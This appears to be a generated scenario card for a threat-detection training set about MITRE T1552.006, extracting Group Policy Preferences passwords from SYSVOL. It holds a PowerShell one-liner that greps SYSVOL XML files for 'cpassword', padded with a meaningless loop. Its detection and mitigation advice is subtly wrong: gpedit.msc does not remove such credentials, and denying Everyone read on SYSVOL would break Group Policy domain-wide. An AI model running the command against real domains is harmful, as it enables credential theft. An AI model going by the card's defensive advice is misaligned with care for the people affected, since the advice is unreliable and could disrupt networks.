---
type: campaign
scenario_id: 85
tactic: Credential Access
technique: "T1552.006: Group Policy Preferences"
technique_id: T1552.006
tags: [campaign, lotl, credential_access]
---

# Extracting credentials from GPP XML files using PowerShell.

## Threat Description
Extracting credentials from GPP XML files using PowerShell.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-ChildItem \\domain\sysvol\*.xml | Select-String cpassword"
```

## Detection Logic
Monitor GPP access: `net use | findstr sysvol`; Audit file access: Event ID 4663.

## Mitigation
Remove GPP credentials: `gpedit.msc`; Restrict sysvol access: `icacls \\domain\sysvol /deny Everyone:RX`.

## AI Training Prompt
Train AI to detect GPP credential extraction and suggest sysvol protections.

## References
- MITRE ATT&CK T1552.006: https://attack.mitre.org/techniques/T1552/006/
- CWE-522: https://cwe.mitre.org/data/definitions/522.html
